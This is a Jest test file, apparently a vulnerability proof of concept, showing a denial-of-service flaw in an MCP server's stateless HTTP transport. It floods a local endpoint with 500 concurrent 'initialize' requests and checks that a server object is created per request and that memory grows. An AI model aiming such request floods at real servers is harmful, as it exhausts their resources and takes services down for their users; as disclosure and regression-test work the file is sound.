import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';

// Mock docs agar tidak keluar jaringan
jest.mock('../../docs/index.js', () => ({
    createDocsSearchTool: jest.fn(async () => {})
}));

// Mock package-info.ts untuk mencegah crash __filename di Jest ESM
jest.mock('../../server/package-info.js', () => ({
    getPackageInfo: () => ({
        name: 'sei-mcp-server',
        version: '0.0.0',
        description: 'Sei MCP Server'
    })
}));

import { StreamableHttpTransport } from '../../server/transport/streamable-http.js';

describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', () => {
    let transport: StreamableHttpTransport;
    const targetPort = 8913; // Gunakan port statis
    let getServerCallCount = 0;
    let originalConsoleError: typeof console.error;

    beforeAll(async () => {
        // Intercept console.error untuk menghitung berapa kali getServer() dieksekusi
        // Karena di dalam getServer() ada: console.error('Supported networks:', ...)
        originalConsoleError = console.error;
        console.error = (...args: any[]) => {
            if (args[0] === 'Supported networks:') {
                getServerCallCount++;
            }
        };

        // Inisialisasi transport streamable-http asli
        transport = new StreamableHttpTransport(targetPort, 'localhost', '/mcp', 'disabled');
        await transport.start({} as any);
    });

    afterAll(async () => {
        // Restore console.error asli
        console.error = originalConsoleError;
        await transport.stop();
    });

    it('should trigger getServer() and memory exhaustion on concurrent requests', async () => {
        const targetUrl = `http://localhost:${targetPort}/mcp`;
        
        const payload = {
            jsonrpc: '2.0',
            method: 'initialize',
            params: { protocolVersion: '2024-11-05', capabilities: {} },
            id: 1
        };

        // Catat memory sebelum serangan
        const memBefore = process.memoryUsage().heapUsed / 1024 / 1024;
        console.log(`\n[Before Attack] Memory usage: ${memBefore.toFixed(2)} MB`);

        // Simulasi serangan DoS: 500 request concurrent
        const attackCount = 500;
        console.log(`[Attack] Sending ${attackCount} concurrent requests to trigger getServer()...`);
        
        const requests = [];
        for (let i = 0; i < attackCount; i++) {
            requests.push(
                fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {}) // Abaikan error
            );
        }

        await Promise.all(requests);
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Catat memory setelah serangan
        const memAfter = process.memoryUsage().heapUsed / 1024 / 1024;

        console.log(`[After Attack] Memory usage: ${memAfter.toFixed(2)} MB`);
        console.log(`[Impact] getServer() triggered: ${getServerCallCount} times`);
        console.log(`[Impact] Memory increased by: ${(memAfter - memBefore).toFixed(2)} MB\n`);

        // VERDICT: Jika getServer() dipanggil per request, getServerCallCount harusnya sama dengan attackCount
        expect(getServerCallCount).toBe(attackCount);
        
        // Verifikasi bahwa memori membengkak (indikasi object instantiation McpServer)
        expect(memAfter).toBeGreaterThan(memBefore);
    });
});
